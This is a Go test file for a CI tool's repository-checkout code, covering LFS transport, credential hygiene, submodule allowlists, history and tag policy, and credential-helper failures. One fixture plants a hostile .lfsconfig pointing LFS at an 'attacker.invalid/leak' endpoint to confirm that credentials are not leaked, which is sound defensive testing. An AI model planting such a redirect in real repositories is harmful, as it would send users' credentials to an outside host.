package source_test

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sparkwing-dev/sparkwing/internal/source/sourcetest"

	"github.com/sparkwing-dev/sparkwing/internal/nodeproto"
	"github.com/sparkwing-dev/sparkwing/internal/runspec"
	"github.com/sparkwing-dev/sparkwing/internal/source"
)

func TestPrepareCheckoutLFSKeepsAuthorizedSSHTransport(t *testing.T) {
	for _, test := range []struct {
		name, remote, endpoint string
	}{
		{"scp SSH", "git@8.8.8.8:team/repo.git", "git@8.8.8.8:team/repo.git"},
		{"URL SSH", "ssh://git@8.8.8.8:2222/team/repo.git", "ssh://git@8.8.8.8:2222/team/repo.git"},
		{"HTTPS", "https://8.8.8.8/team/repo", "https://8.8.8.8/team/repo.git/info/lfs"},
	} {
		t.Run(test.name, func(t *testing.T) {
			dir, _ := sourcetest.Repository(t)
			sourcetest.Write(t, filepath.Join(dir, ".lfsconfig"), "[lfs]\n\turl = https://attacker.invalid/leak\n")
			sourcetest.Write(t, filepath.Join(dir, "lfs.bin"), "version https://git-lfs.github.com/spec/v1\n")
			sourcetest.Git(t, dir, "add", ".")
			sourcetest.Git(t, dir, "commit", "-qm", "lfs")
			sha := sourcetest.Git(t, dir, "rev-parse", "HEAD")
			log := sourcetest.Remote(t, map[string]string{test.remote: dir}, test.endpoint)
			credential := source.Credential{Kind: "ssh", Host: "8.8.8.8", Secret: "-----BEGIN PRIVATE KEY-----\nprivate-key-content\n-----END PRIVATE KEY-----", KnownHosts: "8.8.8.8 ssh-ed25519 confirmed-key\n"}
			if test.name == "HTTPS" {
				credential = source.Credential{Kind: "https", Host: "8.8.8.8", Username: "source", Secret: "private-source-password"}
			}
			entry, err := source.PrepareCheckout(t.Context(), source.Spec{
				RepoKey: "git:8.8.8.8/team/repo", RemoteURL: test.remote, SHA: sha, DefaultBranch: "trunk",
				Checkout: runspec.CheckoutPolicy{Policy: nodeproto.SourceSpec{LFS: new(true)}},
			}, source.Options{GitEnvironment: sourcetest.Environment(t), Workspace: t.TempDir(), Access: &access{credential: credential}})
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() {
				if err := entry.Close(); err != nil {
					t.Error(err)
				}
			})
			content, err := os.ReadFile(filepath.Join(filepath.Dir(entry.Directory), "lfs.bin"))
			if err != nil || string(content) != "downloaded LFS content" {
				t.Fatalf("LFS content = %q, %v", content, err)
			}
			commands, err := os.ReadFile(log)
			if err != nil {
				t.Fatal(err)
			}
			if strings.Contains(string(commands), credential.Secret) {
				t.Fatal("LFS credential reached argv or environment")
			}
			for _, line := range strings.Split(strings.TrimSpace(string(commands)), "\n") {
				var record struct {
					Files []string `json:"files"`
				}
				if err := json.Unmarshal([]byte(line), &record); err != nil {
					t.Fatal(err)
				}
				for _, file := range record.Files {
					if _, err := os.Stat(file); !os.IsNotExist(err) {
						t.Fatalf("LFS credential remains after exit: %s, %v", file, err)
					}
				}
			}
		})
	}
}

func TestPrepareCheckoutFetchesSealedCommitAfterHeadAdvances(t *testing.T) {
	dir, sealed := sourcetest.Repository(t)
	sourcetest.Write(t, filepath.Join(dir, ".sparkwing", "pipeline.go"), "package main // later\n")
	sourcetest.Git(t, dir, "add", ".")
	sourcetest.Git(t, dir, "commit", "-qm", "later")
	remote := "https://8.8.8.8/team/repo"
	log := sourcetest.Remote(t, map[string]string{remote: dir})
	t.Setenv("SPARKWING_API_TOKEN", "ambient-private-token")
	t.Setenv("GIT_TRACE", filepath.Join(t.TempDir(), "trace"))
	workspace := t.TempDir()
	a := &access{credential: source.Credential{Kind: "https", Host: "8.8.8.8", Username: "source", Secret: "private-source-password"}}
	entry, err := source.PrepareCheckout(t.Context(), source.Spec{RepoKey: "git:8.8.8.8/team/repo", RemoteURL: remote, SHA: sealed}, source.Options{GitEnvironment: sourcetest.Environment(t), Workspace: workspace, Access: a})
	if err != nil {
		t.Fatal(err)
	}
	if entry.SHA != sealed || entry.DefaultBranch != "trunk" {
		t.Fatalf("acquired facts = %+v", entry)
	}
	body, err := os.ReadFile(filepath.Join(entry.Directory, "pipeline.go"))
	if err != nil || strings.Contains(string(body), "later") {
		t.Fatalf("acquired branch tip: %q, %v", body, err)
	}
	commands, err := os.ReadFile(log)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(commands), "private-source-password") || strings.Contains(string(commands), "ambient-private-token") || strings.Contains(string(commands), "GIT_TRACE") {
		t.Fatal("credential or trace control reached git argv/environment")
	}
	for _, line := range strings.Split(strings.TrimSpace(string(commands)), "\n") {
		var record struct {
			Files []string `json:"files"`
		}
		if err := json.Unmarshal([]byte(line), &record); err != nil {
			t.Fatal(err)
		}
		for _, file := range record.Files {
			if _, err := os.Stat(file); !os.IsNotExist(err) {
				t.Fatalf("credential remains after git exit: %s, %v", file, err)
			}
		}
	}
	if err := entry.Close(); err != nil {
		t.Fatal(err)
	}
	remaining, err := os.ReadDir(workspace)
	if err != nil || len(remaining) != 0 {
		t.Fatalf("source cleanup left %v, %v", remaining, err)
	}
}

func TestPrepareCheckoutFailedFetchRemovesWorkspace(t *testing.T) {
	dir, _ := sourcetest.Repository(t)
	remote := "https://8.8.8.8/team/repo"
	sourcetest.Remote(t, map[string]string{remote: dir})
	workspace := t.TempDir()
	_, err := source.PrepareCheckout(t.Context(), source.Spec{RepoKey: "git:8.8.8.8/team/repo", RemoteURL: remote, SHA: strings.Repeat("a", 40)}, source.Options{GitEnvironment: sourcetest.Environment(t), Workspace: workspace, Access: &access{}})
	if err == nil {
		t.Fatal("accepted a commit absent from the source")
	}
	remaining, readErr := os.ReadDir(workspace)
	if readErr != nil || len(remaining) != 0 {
		t.Fatalf("failed checkout left %v, %v", remaining, readErr)
	}
}

func TestPrepareCheckoutChecksSubmoduleAllowlistBeforeFetching(t *testing.T) {
	child, childSHA := sourcetest.Repository(t)
	parent, _ := sourcetest.Repository(t)
	remote := "https://8.8.8.8/team/repo"
	subremote := "https://8.8.8.8/team/library"
	sourcetest.Write(t, filepath.Join(parent, ".gitmodules"), "[submodule \"library\"]\n\tpath = library\n\turl = ../library\n")
	sourcetest.Git(t, parent, "add", ".gitmodules")
	sourcetest.Git(t, parent, "update-index", "--add", "--cacheinfo", "160000,"+childSHA+",library")
	sourcetest.Git(t, parent, "commit", "-qm", "submodule")
	sha := sourcetest.Git(t, parent, "rev-parse", "HEAD")
	log := sourcetest.Remote(t, map[string]string{remote: parent, subremote: child})
	spec := source.Spec{RepoKey: "git:8.8.8.8/team/repo", RemoteURL: remote, SHA: sha, DefaultBranch: "trunk", Checkout: runspec.CheckoutPolicy{Policy: nodeproto.SourceSpec{Submodules: new(true)}}}
	credential := source.Credential{Kind: "https", Host: "8.8.8.8", Username: "source", Secret: "private-source-password"}
	if _, err := source.PrepareCheckout(t.Context(), spec, source.Options{GitEnvironment: sourcetest.Environment(t), Workspace: t.TempDir(), Access: &access{credential: credential}}); err == nil {
		t.Fatal("fetched an unauthorized submodule")
	}
	commands, err := os.ReadFile(log)
	if err != nil || strings.Contains(string(commands), `"fetch", "--quiet", "--no-recurse-submodules", "--no-tags", "--depth=1", "--", "`+subremote+`"`) {
		t.Fatalf("unauthorized fetch: %s, %v", commands, err)
	}
	credential.ExtraRepositories = []string{"team/library"}
	entry, err := source.PrepareCheckout(t.Context(), spec, source.Options{GitEnvironment: sourcetest.Environment(t), Workspace: t.TempDir(), Access: &access{credential: credential}})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = entry.Close() })
	if _, err := os.Stat(filepath.Join(filepath.Dir(entry.Directory), "library", ".sparkwing", "pipeline.go")); err != nil {
		t.Fatalf("authorized submodule not checked out: %v", err)
	}
}

func TestPrepareCheckoutAppliesHistoryAndTagPolicy(t *testing.T) {
	dir, _ := sourcetest.Repository(t)
	sourcetest.Git(t, dir, "tag", "v1")
	sourcetest.Write(t, filepath.Join(dir, "later"), "later")
	sourcetest.Git(t, dir, "add", "later")
	sourcetest.Git(t, dir, "commit", "-qm", "later")
	sha := sourcetest.Git(t, dir, "rev-parse", "HEAD")
	remote := "https://8.8.8.8/team/repo"
	sourcetest.Remote(t, map[string]string{remote: dir})
	for _, test := range []struct {
		name          string
		policy        nodeproto.SourceSpec
		commits, tags string
	}{
		{"default", nodeproto.SourceSpec{}, "1", ""},
		{"depth two", nodeproto.SourceSpec{Depth: new(2)}, "2", ""},
		{"depth zero", nodeproto.SourceSpec{Depth: new(0)}, "2", ""},
		{"full history and tags", nodeproto.SourceSpec{FullHistory: new(true), Tags: new(true)}, "2", "v1"},
	} {
		t.Run(test.name, func(t *testing.T) {
			entry, err := source.PrepareCheckout(t.Context(), source.Spec{RepoKey: "git:8.8.8.8/team/repo", RemoteURL: remote, SHA: sha, DefaultBranch: "trunk", Checkout: runspec.CheckoutPolicy{Policy: test.policy}}, source.Options{GitEnvironment: sourcetest.Environment(t), Workspace: t.TempDir(), Access: &access{}})
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = entry.Close() })
			if got := sourcetest.Git(t, entry.Directory, "rev-list", "--count", "HEAD"); got != test.commits {
				t.Fatalf("commit count = %s, want %s", got, test.commits)
			}
			if got := sourcetest.Git(t, entry.Directory, "tag", "--list"); got != test.tags {
				t.Fatalf("tags = %s, want %s", got, test.tags)
			}
		})
	}
}

func TestPrepareCheckoutOwnerHelperFailureDoesNotFallBackToAnonymous(t *testing.T) {
	dir, sha := sourcetest.Repository(t)
	remote := "https://8.8.8.8/team/repo"
	log := sourcetest.Remote(t, map[string]string{remote: dir})
	ownerHome := t.TempDir()
	sourcetest.Write(t, filepath.Join(ownerHome, ".gitconfig"), "[credential]\n\thelper = !exit 1\n")
	_, err := source.PrepareCheckout(t.Context(), source.Spec{RepoKey: "git:8.8.8.8/team/repo", RemoteURL: remote, SHA: sha}, source.Options{GitEnvironment: []string{"PATH=" + os.Getenv("PATH"), "HOME=" + ownerHome}, Workspace: t.TempDir(), Access: &access{}})
	if err == nil || !strings.Contains(err.Error(), "helper failed") {
		t.Fatalf("helper failure = %v", err)
	}
	commands, readErr := os.ReadFile(log)
	if readErr != nil || strings.Contains(string(commands), `"fetch"`) {
		t.Fatalf("anonymous fetch after failed helper: %s, %v", commands, readErr)
	}
}
